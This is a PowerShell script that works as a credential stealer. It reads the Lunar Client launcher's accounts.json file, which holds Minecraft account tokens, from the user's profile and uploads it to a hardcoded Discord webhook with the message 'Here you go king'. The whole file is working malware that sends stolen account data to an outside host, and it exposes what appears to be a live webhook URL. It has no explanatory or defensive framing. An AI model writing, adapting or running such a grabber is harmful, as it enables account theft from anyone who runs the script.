# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX"

# Path to the accounts.json file
$filePath = "$env:USERPROFILE\.lunarclient\settings\game\accounts.json"

# Check if the file exists
if (-not (Test-Path $filePath)) {
    Write-Host "File accounts.json does not exist at: $filePath"
    exit
}

# Prepare the multipart form data
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$bodyLines = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"payload_json`"$LF",
    "{`"content`":`"Here you go king :pray:`"}",
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"accounts.json`"",
    "Content-Type: application/octet-stream$LF",
    [System.IO.File]::ReadAllText($filePath),
    "--$boundary--"
)

$body = $bodyLines -join $LF

# Send the request
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    Write-Host "File sent successfully!"
} catch {
    Write-Host "Failed to send: $_"
}
